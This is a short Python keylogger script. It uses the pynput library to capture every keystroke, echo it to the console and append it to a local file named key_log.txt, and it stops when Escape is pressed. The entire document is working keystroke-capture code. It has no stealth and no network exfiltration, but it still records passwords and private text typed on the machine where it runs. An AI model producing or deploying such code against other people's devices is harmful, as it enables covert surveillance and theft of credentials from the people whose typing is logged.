from pynput.keyboard import Key, Listener

# File to store logged keys
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        print(f"Key pressed: {key}")  # Debugging output
        with open(log_file, "a") as f:
            f.write(str(key).replace("'", "") + " ")
    except Exception as e:
        print(f"Error logging key: {e}")

# Function to handle key release events (optional)
def on_release(key):
    if key == Key.esc:  # Exit on pressing 'Escape'
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
